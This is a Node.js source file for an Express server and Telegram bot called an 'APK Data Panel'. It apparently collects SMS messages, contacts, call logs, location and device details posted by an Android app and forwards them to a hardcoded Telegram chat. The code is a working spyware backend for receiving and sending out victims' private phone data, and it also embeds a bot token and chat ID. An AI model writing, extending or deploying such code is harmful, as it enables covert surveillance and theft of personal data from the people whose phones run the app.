const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");

const BOT_TOKEN = "7322754845:AAEN2ZZlX6wnljDjgFMZPhuJ-MZ2xDGsmis"; // Replace
const CHAT_ID = "8175955990"; // Replace

const app = express();
app.use(express.json());

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Show control buttons
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "📱 APK Data Panel", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📨 Get SMS", callback_data: "get_sms" }],
        [{ text: "👥 Get Contacts", callback_data: "get_contacts" }],
        [{ text: "📞 Get Calls", callback_data: "get_calls" }],
        [{ text: "📍 Get Location", callback_data: "get_location" }],
        [{ text: "📱 Get Device Info", callback_data: "get_device" }]
      ]
    }
  });
});

// Send stored data from local .txt files when button is clicked
bot.on("callback_query", async (query) => {
  const dataType = query.data;
  await bot.answerCallbackQuery(query.id);

  const fileMap = {
    get_sms: "sms.txt",
    get_contacts: "contacts.txt",
    get_calls: "calls.txt",
    get_location: "location.txt",
    get_device: "device.txt"
  };

  const fileName = fileMap[dataType];

  try {
    if (fs.existsSync(fileName)) {
      const content = fs.readFileSync(fileName, "utf8");

      // Split long messages into Telegram-safe chunks
      const chunks = splitIntoChunks(content, 4000);
      for (let i = 0; i < chunks.length; i++) {
        const part = `📥 *${dataType.toUpperCase()}* (part ${i + 1}/${chunks.length})\n\`\`\`\n${chunks[i]}\n\`\`\``;
        await bot.sendMessage(CHAT_ID, part, { parse_mode: "Markdown" });
      }
    } else {
      await bot.sendMessage(CHAT_ID, `⚠️ No ${dataType} data available.`);
    }
  } catch (err) {
    console.error(`❌ Error reading ${fileName}:`, err.message);
    await bot.sendMessage(CHAT_ID, `❌ Error reading ${dataType} file.`);
  }
});

// Handle APK webhook and save data to files
app.post("/apk", async (req, res) => {
  const { type, content } = req.body;

  const safeType = type || "unknown";
  const safeContent = content || "[Empty]";

  fs.appendFileSync(`${safeType}.txt`, safeContent + "\n\n");
  res.sendStatus(200);
});

// Split large messages
function splitIntoChunks(text, maxLen) {
  const chunks = [];
  for (let i = 0; i < text.length; i += maxLen) {
    chunks.push(text.slice(i, i + maxLen));
  }
  return chunks;
}

// Start server
const PORT = 3001;
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}/apk`);
});
